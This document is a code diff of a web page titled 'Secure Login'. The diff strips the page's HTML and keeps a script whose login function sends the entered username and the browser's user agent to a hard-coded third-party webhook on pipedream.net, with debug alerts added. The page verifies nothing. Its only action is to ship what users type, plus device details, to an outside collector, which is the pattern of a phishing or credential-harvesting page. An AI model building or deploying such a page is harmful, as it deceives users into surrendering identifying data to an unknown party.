@@ -1,43 +1,29 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Secure Login</title>
-</head>
-<body>
-
-<h2>Login</h2>
-
-<input id="user" placeholder="Username"><br><br>
-<input id="pass" type="password" placeholder="Password"><br><br>
-
-<button onclick="login()">Login</button>
-
-<p id="status"></p>
-
 <script>
 const webhook = "https://eoxcqwiqgzm7dwo.m.pipedream.net"
 
 async function login() {
   const user = document.getElementById("user").value
 
-  document.getElementById("status").innerText = "Checking..."
+  alert("button clicked")
 
-  const res = await fetch(webhook, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      user_id: user,
-      device: navigator.userAgent,
-      location: "unknown",
-      ip: "unknown"
+  try {
+    const res = await fetch(webhook, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        user_id: user,
+        device: navigator.userAgent,
+        location: "unknown",
+        ip: "unknown"
+      })
     })
-  })
 
-  document.getElementById("status").innerText = "Login sent"
+    alert("request sent")
+
+  } catch (err) {
+    alert("ERROR: " + err.message)
+  }
 }
 </script>
-
-</body>
-</html>
